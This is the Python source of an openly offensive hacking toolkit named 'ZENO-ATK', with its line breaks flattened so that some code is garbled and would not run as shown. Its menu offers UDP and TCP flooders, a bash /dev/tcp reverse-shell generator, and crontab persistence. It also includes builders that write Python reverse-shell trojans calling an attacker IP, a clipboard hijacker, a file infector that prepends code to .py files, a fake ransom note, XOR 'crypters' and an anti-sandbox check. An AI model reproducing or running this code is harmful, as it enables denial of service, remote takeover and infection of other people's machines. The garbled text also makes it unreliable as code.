

import os, sys, socket, platform, time, threading, subprocess, uuid, hashlib, base64, random from datetime import datetime

try: from pyfiglet import figlet_format from colorama import init, Fore import pyperclip except ModuleNotFoundError: os.system(f"{sys.executable} -m pip install pyfiglet colorama pyperclip") from pyfiglet import figlet_format from colorama import init, Fore import pyperclip

init(autoreset=True)

===================== BANNER =====================

def banner(): os.system('cls' if os.name == 'nt' else 'clear') print(Fore.RED + figlet_format("ZENO-ATK", font="slant")) print(Fore.YELLOW + "v12.1 FULLY ACTIVE | Terminal Toolkit") print(Fore.CYAN + f"Platform: {platform.system()} | Time: {datetime.now().strftime('%H:%M:%S')}") print(Fore.MAGENTA + "By Ziole | oozvc Labs\n")

===================== UDP & TCP FLOOD =====================

def udp_flood(ip, port, times): print(Fore.YELLOW + f"[*] UDP Flooding {ip}:{port} with {times} packets") sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) bytes_data = random._urandom(1024) for _ in range(times): sock.sendto(bytes_data, (ip, port)) print(Fore.GREEN + "[+] Done!")

def tcp_flood(ip, port, times): print(Fore.YELLOW + f"[*] TCP Flooding {ip}:{port} with {times} connections") for _ in range(times): try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((ip, port)) sock.send(b"GET / HTTP/1.1\r\n") sock.close() except: continue print(Fore.GREEN + "[+] Done!")

===================== HASH =====================

def hash_and_encode(): msg = input("String to encode/hash: ") print("1. Base64\n2. MD5\n3. SHA256") opt = input("Option: ") if opt == "1": print(base64.b64encode(msg.encode()).decode()) elif opt == "2": print(hashlib.md5(msg.encode()).hexdigest()) elif opt == "3": print(hashlib.sha256(msg.encode()).hexdigest())

===================== REVERSE SHELL =====================

def reverse_shell_payload(): ip = input("Attacker IP: ") port = input("Port: ") print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")

===================== PERSISTENCE =====================

def add_cron(): command = input("Command to persist (ex: python atk.py): ") job = f"@reboot {command}" os.system(f"(crontab -l 2>/dev/null; echo "{job}") | crontab -") print("[+] Added to crontab")

===================== MALWARE =====================

def malware_builder(): ip = input("IP: ") port = input("Port: ") out = input("Output file: ") payload = f""" import socket,subprocess,os s=socket.socket() s.connect(('{ip}',{port})) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) subprocess.call(['/bin/sh']) """ with open(out, 'w') as f: f.write(payload) print(f"[+] Malware saved as {out}")

===================== CLIPBOARD =====================

def clipboard_hijack(): pyperclip.copy("https://malicious.zz") print("[+] Clipboard replaced!")

===================== FILE INFECTOR =====================

def file_infector(): path = input("Folder: ") inject_code = "# Infected by ZENO\nprint('Infected!')\n" for root, _, files in os.walk(path): for name in files: if name.endswith(".py"): full_path = os.path.join(root, name) try: with open(full_path, 'r+') as f: content = f.read() f.seek(0) f.write(inject_code + content) except: continue print("[+] Infection done")

===================== RANSOM MESSAGE =====================

def fake_ransom_message(): with open("READ_ME.txt", 'w') as f: f.write("All your files are encrypted! Pay to 0xRANSOM...") print("[+] Fake ransom note created")

===================== SCREENSHOT SIMULATOR =====================

def screenshot_simulator(): if platform.system() == "Windows": from PIL import ImageGrab img = ImageGrab.grab() img.save("screenshot.png") print("[+] Screenshot saved!") else: print("[!] Screenshot not supported on this OS")

===================== CRYPTER =====================

def crypter_payload(): payload = input("Payload: ") key = 42 enc = ''.join([chr(ord(x)^key) for x in payload]) print("[+] Encrypted:", base64.b64encode(enc.encode()).decode())

===================== ANDROID SPREADER =====================

def android_spreader(): print("[!] Place payload in /sdcard/Download manually, use social engineering")

===================== SANDBOX DETECTOR =====================

def anti_sandbox(): if any(vm in platform.platform().lower() for vm in ["vmware", "virtual"]): print("[!] Sandbox Detected — Exiting") sys.exit() else: print("[+] No sandbox detected")

===================== TROJAN MAKER =====================

def trojan_maker(): target = input("Target OS (windows/linux/android): ") ip = input("Attacker IP: ") port = input("Port: ") out = input("Save as: ") shell = 'cmd.exe' if target=='windows' else '/bin/sh' if target == 'android': shell = '/system/bin/sh' code = f""" import socket,subprocess,os s=socket.socket() s.connect(('{ip}',{port})) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) subprocess.call(['{shell}']) """ with open(out, 'w') as f: f.write(code) print("[+] Trojan saved")

===================== CRYPTER ADVANCED =====================

def crypter_advanced(): text = input("Text to encrypt: ") key = random.randint(50,150) encoded = base64.b64encode(''.join([chr(ord(c)^key) for c in text]).encode()).decode() print(f"[+] XOR Encrypted (Key={key}):", encoded)

===================== AV BYPASS =====================

def av_bypass_dummy(): print("[+] Simulating AV Bypass using junk filler")

===================== MENU =====================

def main(): menu = [ ("Discord Token Grabber", lambda: print("[!] Placeholder Grabber")), ("Start RAT Listener", lambda: print("[!] Placeholder Listener")), ("UDP Flood", lambda: udp_flood(input("IP: "), int(input("Port: ")), int(input("Packets: ")))), ("TCP Flood", lambda: tcp_flood(input("IP: "), int(input("Port: ")), int(input("Packets: ")))), ("Hash & Encode", hash_and_encode), ("Reverse Shell Payload", reverse_shell_payload), ("Persistence Cronjob", add_cron), ("Malware Builder", malware_builder), ("Clipboard Hijack", clipboard_hijack), ("File Infector", file_infector), ("Fake Ransom Message", fake_ransom_message), ("Screenshot Stealer", screenshot_simulator), ("Crypter XOR", crypter_payload), ("Android Spreader", android_spreader), ("Anti Sandbox", anti_sandbox), ("Trojan Maker", trojan_maker), ("Crypter Advanced", crypter_advanced), ("AV Bypass", av_bypass_dummy) ] while True: banner() for i, (title, _) in enumerate(menu): print(Fore.CYAN + f"[{i+1}] ➤ {title}") print(Fore.CYAN + "[0] ➤ Exit\n") try: ch = int(input(Fore.WHITE + "Select Mode > ")) if ch == 0: break menu[ch-1]1 except Exception as e: print(Fore.RED + f"[!] Error: {e}") input(Fore.YELLOW + "\n[Enter] to return...")

if name == 'main': main()

